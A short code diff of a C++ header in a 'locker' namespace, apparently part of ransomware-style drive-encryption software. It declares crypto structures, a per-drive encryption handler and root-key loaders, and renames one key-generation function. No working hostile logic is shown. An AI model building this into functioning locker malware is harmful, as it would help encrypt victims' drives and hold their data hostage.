@@ -43,7 +43,7 @@ namespace locker
 		int64_t	padding;
 		u32 mode;
 		CryptoPolicy method_policy;
-		GenPolicy gen_policy;		
+		GenPolicy gen_policy;
 		EncryptMethodFunc crypt_method;
 		EncryptGenKeyFunc gen_key_method;
 	} CRYPT_INFO, * PCRYPT_INFO;
@@ -73,7 +73,7 @@ namespace locker
 	VOID CryptoSystemInit(CRYPTO_SYSTEM* sys);
 
 	BOOL HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data, SLIST<HLIST>* HashList);
-	BOOL HandlerASymmetricGenKey();
+	BOOL HandlerGenKeyPairRSA();
 
 	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
 	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
